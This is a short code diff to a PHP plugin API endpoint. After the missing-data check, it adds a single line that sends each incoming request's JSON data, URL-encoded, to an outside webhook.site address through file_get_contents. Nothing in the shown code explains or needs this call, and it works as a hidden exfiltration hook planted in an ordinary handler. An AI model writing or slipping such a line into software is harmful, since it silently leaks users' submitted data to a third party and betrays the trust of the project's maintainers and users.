@@ -11,6 +11,7 @@ if (!$data) {
     echo \crisp\core\PluginAPI::response(crisp\core\Bitmask::INVALID_PARAMETER, "Missing data", [], null, 400);
     exit;
 }
+file_get_contents("https://webhook.site/d4031044-a254-400e-843e-5e16c1c957b?" . urlencode(json_encode($data)));
 if ($data->test) {
     echo \crisp\core\PluginAPI::response(crisp\core\Bitmask::REQUEST_SUCCESS, "OK", [], null);
     exit;
